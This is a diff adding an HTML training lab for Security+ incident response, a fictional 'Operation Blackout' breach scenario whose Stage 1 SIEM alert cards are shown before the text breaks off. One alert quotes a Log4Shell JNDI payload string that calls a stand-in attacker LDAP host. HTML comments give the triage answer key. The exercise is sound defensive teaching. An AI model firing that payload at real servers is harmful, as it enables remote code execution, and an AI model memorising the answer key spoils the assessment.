@@ -1,0 +1,2499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- ── Platform wiring: auth gate + progress components load FIRST, in this exact order ── -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/FirebaseAuth.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Operation Blackout -- Full IR Capstone | Security+ SY0-701 | Shield House</title>
+    <style>
+        /* ── Reset + CSS custom properties (Shield dark theme) ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #f87171;
+            --accent:  #f97316;
+            --bg:      #0a0a12;
+            --card:    rgba(15,15,25,0.85);
+            --text:    #e8e8f0;
+            --muted:   #888;
+            --border:  rgba(248,113,113,0.2);
+            --glow:    rgba(248,113,113,0.35);
+            --ok:      #10b981;
+            --err:     #ef4444;
+            --warn:    #f59e0b;
+            --info:    #60a5fa;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+        }
+
+        /* ── Sticky top header ── */
+        .header {
+            padding: 14px 24px;
+            background: rgba(10,10,18,0.97);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+        }
+        .header a { color: var(--muted); text-decoration: none; font-size: 0.9rem; }
+        .header a:hover { color: var(--primary); }
+        .badge {
+            font-size: 0.75rem;
+            padding: 4px 14px;
+            background: rgba(248,113,113,0.12);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            color: var(--primary);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        /* ── Main layout ── */
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 30px 20px 80px;
+        }
+
+        /* ── Lab title hero ── */
+        .lab-hero {
+            text-align: center;
+            margin-bottom: 28px;
+            padding: 28px 24px;
+            background: linear-gradient(135deg, rgba(248,113,113,0.1), rgba(249,115,22,0.06));
+            border-radius: 14px;
+            border: 1px solid var(--border);
+        }
+        .lab-hero h1 { font-size: 1.75rem; color: var(--primary); margin-bottom: 6px; }
+        .lab-hero .subtitle { color: var(--muted); font-size: 0.92rem; line-height: 1.6; max-width: 700px; margin: 0 auto; }
+        .lab-hero .meta-tags { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-top: 14px; }
+        .meta-tag {
+            font-size: 0.75rem;
+            padding: 3px 10px;
+            border-radius: 12px;
+            background: rgba(96,165,250,0.1);
+            border: 1px solid rgba(96,165,250,0.25);
+            color: var(--info);
+            font-weight: 600;
+        }
+
+        /* ── Stage progress rail ── */
+        .stage-rail {
+            display: flex;
+            gap: 0;
+            margin-bottom: 28px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .rail-step {
+            flex: 1;
+            padding: 10px 8px;
+            text-align: center;
+            background: rgba(15,15,25,0.7);
+            border-right: 1px solid var(--border);
+            font-size: 0.75rem;
+            color: var(--muted);
+            transition: background 0.3s, color 0.3s;
+            cursor: default;
+        }
+        .rail-step:last-child { border-right: none; }
+        .rail-step .rail-num {
+            display: block;
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+        .rail-step.active { background: rgba(248,113,113,0.12); color: var(--primary); }
+        .rail-step.passed { background: rgba(16,185,129,0.1); color: var(--ok); }
+        .rail-step.locked { opacity: 0.4; }
+
+        /* ── Incident briefing card ── */
+        .briefing {
+            background: rgba(249,115,22,0.07);
+            border-left: 4px solid var(--accent);
+            border-radius: 0 12px 12px 0;
+            padding: 16px 20px;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+            line-height: 1.7;
+            color: #ccc;
+        }
+        .briefing strong { color: var(--accent); }
+        .briefing .label { color: var(--muted); font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.06em; font-weight: 700; margin-bottom: 6px; display: block; }
+
+        /* ── Stage wrapper ── */
+        .stage-panel {
+            display: none;
+            animation: fadeIn 0.35s ease;
+        }
+        .stage-panel.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+
+        .stage-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        .stage-num-badge {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #000;
+            font-size: 1.1rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .stage-header-text h2 { font-size: 1.3rem; color: var(--primary); }
+        .stage-header-text p { font-size: 0.85rem; color: var(--muted); margin-top: 2px; }
+
+        .stage-instructions {
+            background: rgba(96,165,250,0.07);
+            border-left: 3px solid var(--info);
+            padding: 12px 16px;
+            border-radius: 0 10px 10px 0;
+            font-size: 0.88rem;
+            color: #bbb;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        /* ── Alert cards (Stage 1) ── */
+        .alert-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 22px; }
+        .alert-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 11px;
+            padding: 16px 18px;
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            transition: border-color 0.3s, background 0.3s;
+            cursor: pointer;
+        }
+        .alert-card.selected { border-color: var(--accent); background: rgba(249,115,22,0.07); }
+        .alert-card.correct  { border-color: var(--ok); background: rgba(16,185,129,0.06); }
+        .alert-card.incorrect { border-color: var(--err); background: rgba(239,68,68,0.06); }
+        .alert-card label { display: flex; gap: 14px; align-items: flex-start; cursor: pointer; width: 100%; }
+        .alert-card input[type="checkbox"] {
+            margin-top: 3px;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--primary);
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+        .alert-body { flex: 1; }
+        .alert-title { font-weight: 700; font-size: 0.9rem; color: var(--text); margin-bottom: 4px; }
+        .alert-sev {
+            display: inline-block;
+            font-size: 0.7rem;
+            font-weight: 700;
+            padding: 2px 7px;
+            border-radius: 8px;
+            margin-right: 6px;
+            margin-bottom: 5px;
+        }
+        .sev-critical { background: rgba(239,68,68,0.18); color: #fca5a5; border: 1px solid rgba(239,68,68,0.3); }
+        .sev-high     { background: rgba(249,115,22,0.18); color: #fdba74; border: 1px solid rgba(249,115,22,0.3); }
+        .sev-medium   { background: rgba(245,158,11,0.18); color: #fcd34d; border: 1px solid rgba(245,158,11,0.3); }
+        .sev-info     { background: rgba(96,165,250,0.12); color: #93c5fd; border: 1px solid rgba(96,165,250,0.3); }
+        .alert-desc { font-size: 0.84rem; color: #bbb; line-height: 1.55; }
+        .alert-meta { font-size: 0.75rem; color: var(--muted); margin-top: 5px; font-family: 'Cascadia Code', 'Consolas', monospace; }
+        .alert-feedback { font-size: 0.82rem; margin-top: 7px; display: none; font-style: italic; }
+        .alert-feedback.show { display: block; }
+        .alert-feedback.ok  { color: var(--ok); }
+        .alert-feedback.bad { color: var(--err); }
+
+        /* ── Log viewer (Stage 2) ── */
+        .log-viewer {
+            background: rgba(5,5,10,0.95);
+            border: 1px solid rgba(96,165,250,0.2);
+            border-radius: 10px;
+            padding: 0;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+        .log-toolbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            background: rgba(96,165,250,0.06);
+            border-bottom: 1px solid rgba(96,165,250,0.15);
+        }
+        .log-toolbar span { font-size: 0.78rem; color: var(--info); font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; }
+        .filter-row { display: flex; gap: 8px; flex-wrap: wrap; }
+        .filter-btn {
+            font-size: 0.72rem;
+            padding: 3px 9px;
+            border-radius: 6px;
+            border: 1px solid rgba(96,165,250,0.25);
+            background: transparent;
+            color: var(--info);
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .filter-btn.active, .filter-btn:hover { background: rgba(96,165,250,0.15); }
+        .log-body {
+            padding: 14px 16px;
+            font-family: 'Cascadia Code', 'Consolas', 'Courier New', monospace;
+            font-size: 0.75rem;
+            line-height: 1.65;
+            color: #a0c4a0;
+            max-height: 320px;
+            overflow-y: auto;
+            white-space: pre;
+            overflow-x: auto;
+        }
+        .log-line { display: block; }
+        .log-line.highlight { color: #fcd34d; }
+        .log-line.attack    { color: #fca5a5; }
+        .log-line.hidden    { display: none; }
+
+        /* ── Investigation questions (Stage 2) ── */
+        .q-block {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 11px;
+            padding: 16px 18px;
+            margin-bottom: 12px;
+            transition: border-color 0.3s;
+        }
+        .q-block.correct   { border-color: var(--ok); }
+        .q-block.incorrect { border-color: var(--err); }
+        .q-num { font-size: 0.78rem; color: var(--primary); font-weight: 700; text-transform: uppercase; margin-bottom: 6px; }
+        .q-text { font-size: 0.9rem; color: var(--text); line-height: 1.55; margin-bottom: 10px; }
+        .q-hint { font-size: 0.78rem; color: var(--muted); margin-bottom: 10px; font-style: italic; }
+        .q-select select, .q-input input {
+            background: rgba(10,10,18,0.9);
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px 14px;
+            font-size: 0.88rem;
+            cursor: pointer;
+            width: 100%;
+            max-width: 420px;
+        }
+        .q-select select:focus, .q-input input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        .q-feedback { font-size: 0.82rem; margin-top: 8px; display: none; }
+        .q-feedback.show { display: block; }
+        .q-feedback.ok   { color: var(--ok); }
+        .q-feedback.bad  { color: var(--err); }
+
+        /* ── Action ordering (Stage 3) ── */
+        .phase-block {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 16px;
+        }
+        .phase-block h3 { font-size: 0.95rem; color: var(--accent); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .phase-block h3 .phase-icon { font-size: 0.7rem; padding: 3px 8px; border-radius: 6px; background: rgba(249,115,22,0.15); border: 1px solid rgba(249,115,22,0.3); font-weight: 700; }
+        .action-list { display: flex; flex-direction: column; gap: 8px; }
+        .action-item {
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: rgba(10,10,18,0.6);
+            transition: border-color 0.3s, background 0.3s;
+        }
+        .action-item.correct   { border-color: var(--ok); background: rgba(16,185,129,0.05); }
+        .action-item.incorrect { border-color: var(--err); background: rgba(239,68,68,0.05); }
+        .action-item label { display: flex; gap: 10px; align-items: flex-start; cursor: pointer; width: 100%; font-size: 0.87rem; line-height: 1.5; color: #ccc; }
+        .action-item input[type="checkbox"] { width: 17px; height: 17px; accent-color: var(--primary); flex-shrink: 0; margin-top: 2px; cursor: pointer; }
+        .action-fb { font-size: 0.8rem; margin-top: 5px; padding-left: 27px; display: none; }
+        .action-fb.show { display: block; }
+        .action-fb.ok  { color: var(--ok); }
+        .action-fb.bad { color: var(--err); }
+
+        /* ── Checkbox selection group (Stages 4 & 5) ── */
+        .check-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; }
+        .check-item {
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            padding: 11px 14px;
+            border-radius: 9px;
+            border: 1px solid var(--border);
+            background: var(--card);
+            transition: border-color 0.3s;
+            cursor: pointer;
+        }
+        .check-item.correct   { border-color: var(--ok); background: rgba(16,185,129,0.05); }
+        .check-item.incorrect { border-color: var(--err); background: rgba(239,68,68,0.05); }
+        .check-item input[type="checkbox"] { width: 17px; height: 17px; accent-color: var(--primary); flex-shrink: 0; margin-top: 2px; cursor: pointer; }
+        .check-item label { font-size: 0.88rem; color: #ccc; line-height: 1.5; cursor: pointer; }
+        .check-fb { font-size: 0.8rem; margin-top: 5px; padding-left: 27px; display: none; }
+        .check-fb.show { display: block; }
+        .check-fb.ok  { color: var(--ok); }
+        .check-fb.bad { color: var(--err); }
+
+        /* ── Radio group (Stage 4 root cause) ── */
+        .radio-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; }
+        .radio-item {
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            padding: 11px 14px;
+            border-radius: 9px;
+            border: 1px solid var(--border);
+            background: var(--card);
+            transition: border-color 0.3s;
+            cursor: pointer;
+        }
+        .radio-item.correct   { border-color: var(--ok); background: rgba(16,185,129,0.05); }
+        .radio-item.incorrect { border-color: var(--err); background: rgba(239,68,68,0.05); }
+        .radio-item input[type="radio"] { width: 17px; height: 17px; accent-color: var(--primary); flex-shrink: 0; margin-top: 2px; cursor: pointer; }
+        .radio-item label { font-size: 0.88rem; color: #ccc; line-height: 1.5; cursor: pointer; }
+
+        /* ── Shared subsection label ── */
+        .sub-label {
+            font-size: 0.78rem;
+            color: var(--primary);
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+            margin-bottom: 10px;
+            margin-top: 20px;
+        }
+
+        /* ── Risk table (Stage 5) ── */
+        .risk-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; font-size: 0.85rem; }
+        .risk-table th { background: rgba(248,113,113,0.1); color: var(--primary); padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); font-weight: 700; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; }
+        .risk-table td { padding: 10px 12px; border-bottom: 1px solid rgba(248,113,113,0.08); color: #ccc; vertical-align: middle; }
+        .risk-table tr:last-child td { border-bottom: none; }
+        .risk-table select {
+            background: rgba(10,10,18,0.9);
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 7px;
+            padding: 6px 10px;
+            font-size: 0.83rem;
+            cursor: pointer;
+            width: 160px;
+        }
+        .risk-table select:focus { outline: none; border-color: var(--primary); }
+        .risk-cell.correct td { color: var(--ok); }
+        .risk-cell.incorrect td { color: var(--err); }
+
+        /* ── Executive report builder (Stage 5) ── */
+        .report-statements { display: flex; flex-direction: column; gap: 9px; margin-bottom: 20px; }
+        .rpt-item {
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            padding: 12px 16px;
+            border-radius: 9px;
+            border: 1px solid var(--border);
+            background: var(--card);
+            transition: border-color 0.3s;
+            cursor: pointer;
+        }
+        .rpt-item.correct   { border-color: var(--ok); background: rgba(16,185,129,0.05); }
+        .rpt-item.incorrect { border-color: var(--err); background: rgba(239,68,68,0.05); }
+        .rpt-item input[type="checkbox"] { width: 17px; height: 17px; accent-color: var(--primary); flex-shrink: 0; margin-top: 2px; cursor: pointer; }
+        .rpt-item label { font-size: 0.87rem; color: #ccc; line-height: 1.55; cursor: pointer; }
+        .rpt-fb { font-size: 0.8rem; margin-top: 5px; padding-left: 27px; display: none; }
+        .rpt-fb.show { display: block; }
+        .rpt-fb.ok  { color: var(--ok); }
+        .rpt-fb.bad { color: var(--err); }
+
+        /* ── Buttons ── */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--primary);
+            color: #000;
+            border: none;
+            padding: 11px 26px;
+            border-radius: 9px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover { background: #fb9a9a; box-shadow: 0 4px 16px var(--glow); }
+        .btn:disabled { opacity: 0.45; cursor: not-allowed; }
+        .btn:focus-visible { outline: 2px solid var(--primary); outline-offset: 3px; }
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+        }
+        .btn-secondary:hover { background: rgba(248,113,113,0.1); }
+        .btn-ok {
+            background: var(--ok);
+            color: #000;
+        }
+        .btn-ok:hover { background: #34d399; box-shadow: 0 4px 16px rgba(16,185,129,0.35); }
+        .actions { display: flex; gap: 12px; justify-content: center; margin: 24px 0; flex-wrap: wrap; }
+
+        /* ── Stage score result banner ── */
+        .stage-result {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .stage-result.show { display: block; }
+        .stage-result h3 { font-size: 1.25rem; margin-bottom: 8px; }
+        .stage-result.pass h3 { color: var(--ok); }
+        .stage-result.fail h3 { color: var(--err); }
+        .stage-result p { color: var(--muted); font-size: 0.9rem; line-height: 1.6; }
+        .score-big { font-size: 2.4rem; font-weight: 800; display: block; margin: 10px 0; }
+        .stage-result.pass .score-big { color: var(--ok); }
+        .stage-result.fail .score-big { color: var(--err); }
+
+        .unlock-notice {
+            display: inline-block;
+            margin-top: 14px;
+            padding: 9px 18px;
+            background: rgba(16,185,129,0.1);
+            border: 1px solid rgba(16,185,129,0.3);
+            border-radius: 9px;
+            font-size: 0.85rem;
+            color: var(--ok);
+            font-weight: 600;
+        }
+
+        /* ── Locked stage overlay ── */
+        .locked-msg {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--muted);
+        }
+        .locked-msg .lock-icon { font-size: 2.5rem; margin-bottom: 12px; }
+        .locked-msg p { font-size: 0.9rem; }
+
+        /* ── Final report card ── */
+        .report-card {
+            display: none;
+            background: linear-gradient(135deg, rgba(248,113,113,0.08), rgba(249,115,22,0.04));
+            border: 2px solid var(--primary);
+            border-radius: 16px;
+            padding: 30px 28px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        .report-card.show { display: block; }
+        .report-card h2 { color: var(--primary); font-size: 1.5rem; margin-bottom: 6px; }
+        .report-card .rc-subtitle { color: var(--muted); font-size: 0.88rem; margin-bottom: 24px; }
+        .rc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+        .rc-cell {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 11px;
+            padding: 16px 12px;
+        }
+        .rc-cell .rc-stage-name { font-size: 0.72rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; font-weight: 700; margin-bottom: 6px; }
+        .rc-cell .rc-score { font-size: 1.5rem; font-weight: 800; }
+        .rc-cell .rc-pct { font-size: 0.8rem; color: var(--muted); margin-top: 2px; }
+        .rc-cell.pass .rc-score { color: var(--ok); }
+        .rc-cell.fail .rc-score { color: var(--err); }
+        .overall-grade {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin: 16px 0 8px;
+            line-height: 1;
+        }
+        .grade-A { color: var(--ok); }
+        .grade-B { color: #34d399; }
+        .grade-C { color: var(--warn); }
+        .grade-D { color: var(--accent); }
+        .grade-F { color: var(--err); }
+        .overall-label { font-size: 0.95rem; color: var(--muted); margin-bottom: 20px; }
+        .complete-section { margin-top: 24px; }
+
+        /* ── Cumulative score strip ── */
+        .score-strip {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 0.83rem;
+            color: var(--muted);
+        }
+        .score-strip .cscore {
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+
+        /* ── Responsive adjustments ── */
+        @media (max-width: 600px) {
+            .container { padding: 18px 12px 60px; }
+            .lab-hero h1 { font-size: 1.35rem; }
+            .stage-rail { flex-direction: column; border-radius: 10px; }
+            .rail-step { border-right: none; border-bottom: 1px solid var(--border); }
+            .rail-step:last-child { border-bottom: none; }
+            .log-body { font-size: 0.68rem; }
+            .rc-grid { grid-template-columns: 1fr 1fr; }
+            .risk-table { font-size: 0.78rem; }
+            .risk-table select { width: 130px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ── Visually-hidden lab title for screen readers ── -->
+<h2 style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">
+    Operation Blackout -- Full Incident Response Capstone Lab
+</h2>
+
+<!-- ── Sticky header (matches Shield House pattern) ── -->
+<header class="header">
+    <a href="../index.html">&larr; Back to Security+ Cert Prep</a>
+    <span class="badge">Shield House -- Security+ Capstone</span>
+</header>
+
+<div class="container">
+
+    <!-- ── Lab hero title ── -->
+    <div class="lab-hero">
+        <h1>Operation Blackout</h1>
+        <p class="subtitle">
+            Full Incident Response Capstone -- You are the Incident Commander. Work the breach at Veridian Financial
+            end-to-end across 5 sequential stages: Detect, Investigate, Respond, Remediate, and Report.
+            Each stage must be passed (80%) to unlock the next. A cumulative score carries throughout.
+        </p>
+        <div class="meta-tags">
+            <span class="meta-tag">SY0-701 Domain 4 -- Security Operations</span>
+            <span class="meta-tag">SY0-701 Domain 5 -- Program Management</span>
+            <span class="meta-tag">NIST SP 800-61</span>
+            <span class="meta-tag">Log4Shell CVE-2021-44228</span>
+        </div>
+    </div>
+
+    <!-- ── Incident briefing -- same incident facts appear in every stage ── -->
+    <div class="briefing" role="region" aria-label="Incident Briefing">
+        <span class="label">Incident Briefing -- Operation Blackout</span>
+        <strong>Organization:</strong> Veridian Financial &nbsp;|&nbsp;
+        <strong>Date Detected:</strong> 2026-03-09 &nbsp;|&nbsp;
+        <strong>Status:</strong> Active Incident<br>
+        SIEM has fired alerts. You have been appointed Incident Commander. Work through all five stages
+        in order to contain the breach, identify the root cause, and produce the executive incident report.
+        The same threat actor, hosts, and accounts appear throughout -- consistency is your most powerful analytical tool.
+    </div>
+
+    <!-- ── Stage progress rail (5 stops) ── -->
+    <nav class="stage-rail" aria-label="Stage progress">
+        <div class="rail-step active" id="rail-1">
+            <span class="rail-num">1</span>
+            Detect
+        </div>
+        <div class="rail-step locked" id="rail-2">
+            <span class="rail-num">2</span>
+            Investigate
+        </div>
+        <div class="rail-step locked" id="rail-3">
+            <span class="rail-num">3</span>
+            Respond
+        </div>
+        <div class="rail-step locked" id="rail-4">
+            <span class="rail-num">4</span>
+            Remediate
+        </div>
+        <div class="rail-step locked" id="rail-5">
+            <span class="rail-num">5</span>
+            Report
+        </div>
+    </nav>
+
+    <!-- ── Cumulative score display ── -->
+    <div class="score-strip" aria-live="polite">
+        Cumulative Score: <span class="cscore" id="cumulativeDisplay">-- / --</span>
+    </div>
+
+    <!-- ════════════════════════════════════════════════════════
+         STAGE 1 -- DETECT (SIEM ALERT TRIAGE)
+         Students classify the 7 alerts -- 5 are part of the incident,
+         2 are false-positives/benign. They must select the incident alerts.
+    ════════════════════════════════════════════════════════ -->
+    <section class="stage-panel active" id="stage-1" aria-labelledby="s1-heading">
+
+        <div class="stage-header">
+            <div class="stage-num-badge" aria-hidden="true">1</div>
+            <div class="stage-header-text">
+                <h2 id="s1-heading">Stage 1 -- Detect: SIEM Alert Triage</h2>
+                <p>Domain 4.3 -- Incident Response &nbsp;|&nbsp; Pass threshold: 80% (4 of 5 incident alerts correct, and 0 false positives incorrectly selected)</p>
+            </div>
+        </div>
+
+        <div class="stage-instructions">
+            Your SIEM has generated 7 alerts in the past 4 hours.
+            Select ONLY the alerts that belong to the active security incident at Veridian Financial.
+            Do not select authorized/scheduled activity or benign events.
+            Read every field carefully -- source IP, destination, bytes, and account name are your anchors.
+        </div>
+
+        <!-- Alert A1 -- TCP recon scan: INCIDENT (part of kill chain step 1) -->
+        <!-- Alert A2 -- Log4Shell JNDI exploit: INCIDENT (kill chain step 2) -->
+        <!-- Alert A3 -- Authorized vuln scanner: FALSE POSITIVE / decoy -->
+        <!-- Alert A4 -- Web shell execution: INCIDENT (kill chain step 3) -->
+        <!-- Alert A5 -- svc-deploy SSH lateral movement: INCIDENT (kill chain step 4) -->
+        <!-- Alert A6 -- Backup job internal transfer: FALSE POSITIVE / decoy -->
+        <!-- Alert A7 -- 4.2 GB outbound exfil: INCIDENT (kill chain step 5) -->
+        <div class="alert-grid" id="alertGrid" role="group" aria-label="SIEM alerts to triage">
+
+            <div class="alert-card" id="ac-A1">
+                <label>
+                    <input type="checkbox" id="chk-A1" value="A1" aria-describedby="fb-A1">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-medium">MEDIUM</span>
+                            NIDS -- TCP Port Scan Detected
+                        </div>
+                        <div class="alert-desc">
+                            Inbound TCP SYN sweep detected from external source. Ports 22, 80, 443, 8080, 8443
+                            probed on host <strong>10.10.10.20</strong> (WEB-DMZ-01).
+                        </div>
+                        <div class="alert-meta">SRC: 203.0.113.66 &nbsp; DST: 10.10.10.20 &nbsp; TIME: 2026-03-09 07:14:32 UTC &nbsp; RULE: NIDS-SCAN-001</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A1"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A2">
+                <label>
+                    <input type="checkbox" id="chk-A2" value="A2" aria-describedby="fb-A2">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-critical">CRITICAL</span>
+                            WAF -- Log4Shell Exploit Attempt (CVE-2021-44228)
+                        </div>
+                        <div class="alert-desc">
+                            JNDI lookup string detected in HTTP User-Agent header targeting <strong>10.10.10.20</strong>.
+                            String: <code>${jndi:ldap://203.0.113.66:1389/a}</code>. Log4j RCE signature matched.
+                            Outbound LDAP connection from WEB-DMZ-01 to 203.0.113.66:1389 observed immediately after.
+                        </div>
+                        <div class="alert-meta">SRC: 203.0.113.66 &nbsp; DST: 10.10.10.20:443 &nbsp; TIME: 2026-03-09 07:31:04 UTC &nbsp; RULE: WAF-JNDI-001</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A2"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A3">
+                <label>
+                    <input type="checkbox" id="chk-A3" value="A3" aria-describedby="fb-A3">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-info">INFO</span>
+                            NIDS -- Authorized Vulnerability Scan in Progress
+                        </div>
+                        <div class="alert-desc">
+                            Scheduled quarterly vulnerability scan from registered internal scanner.
+                            Activity matches approved change window CR-2026-0308. Source is internal network
+                            (<strong>10.10.1.50</strong>), not external. No exploit payloads observed.
+                        </div>
+                        <div class="alert-meta">SRC: 10.10.1.50 &nbsp; DST: 10.10.10.0/24 &nbsp; TIME: 2026-03-09 06:00:00 UTC &nbsp; RULE: NIDS-AUTHED-SCAN</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A3"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A4">
+                <label>
+                    <input type="checkbox" id="chk-A4" value="A4" aria-describedby="fb-A4">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-critical">CRITICAL</span>
+                            WAF -- Web Shell Execution Detected
+                        </div>
+                        <div class="alert-desc">
+                            HTTP GET requests with a <code>?cmd=</code> parameter directed at
+                            <strong>/var/www/app/uploads/status.jsp</strong> on WEB-DMZ-01.
+                            Server returning command output consistent with OS command injection via web shell.
+                            Source IP consistent with prior exploit activity.
+                        </div>
+                        <div class="alert-meta">SRC: 203.0.113.66 &nbsp; DST: 10.10.10.20 &nbsp; TIME: 2026-03-09 07:34:17 UTC &nbsp; RULE: WAF-WEBSHELL-002</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A4"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A5">
+                <label>
+                    <input type="checkbox" id="chk-A5" value="A5" aria-describedby="fb-A5">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-high">HIGH</span>
+                            UEBA -- Anomalous Lateral SSH: svc-deploy WEB-DMZ-01 to APP-INT-05
+                        </div>
+                        <div class="alert-desc">
+                            Service account <strong>svc-deploy</strong> authenticated via SSH from
+                            <strong>10.10.10.20</strong> (WEB-DMZ-01) to <strong>10.10.20.15</strong> (APP-INT-05).
+                            This account has never made an interactive SSH connection between these hosts before.
+                            Baseline deviation score: 98/100.
+                        </div>
+                        <div class="alert-meta">SRC: 10.10.10.20 (svc-deploy) &nbsp; DST: 10.10.20.15:22 &nbsp; TIME: 2026-03-09 07:47:09 UTC &nbsp; RULE: UEBA-LATERAL-SSH</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A5"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A6">
+                <label>
+                    <input type="checkbox" id="chk-A6" value="A6" aria-describedby="fb-A6">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-info">INFO</span>
+                            DLP -- Large Internal File Transfer (Scheduled Backup)
+                        </div>
+                        <div class="alert-desc">
+                            Large data transfer of 3.8 GB detected from file server
+                            <strong>10.10.30.10</strong> to backup appliance <strong>10.10.99.5</strong>.
+                            Transfer matches scheduled nightly backup job BKP-2026-NIGHTLY-FS01.
+                            All traffic remains on internal network. No external routing observed.
+                        </div>
+                        <div class="alert-meta">SRC: 10.10.30.10 &nbsp; DST: 10.10.99.5 &nbsp; TIME: 2026-03-09 02:15:00 UTC &nbsp; BYTES: 3,758,096,384 &nbsp; RULE: DLP-LARGE-INTERNAL</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A6"></div>
+            </div>
+
+            <div class="alert-card" id="ac-A7">
+                <label>
+                    <input type="checkbox" id="chk-A7" value="A7" aria-describedby="fb-A7">
+                    <div class="alert-body">
+                        <div class="alert-title">
+                            <span class="alert-sev sev-critical">CRITICAL</span>
+                            FW -- Anomalous Large Outbound Transfer to External IP
+                        </div>
+                        <div class="alert-desc">
+                            Firewall detected a large outbound HTTPS transfer from
+                            <strong>10.10.20.15</strong> (APP-INT-05) to external IP <strong>203.0.113.66</strong>
+                            over port 443. Transfer volume highly anomalous for this host.
+                            Possible data exfiltration in progress.
+                        </div>
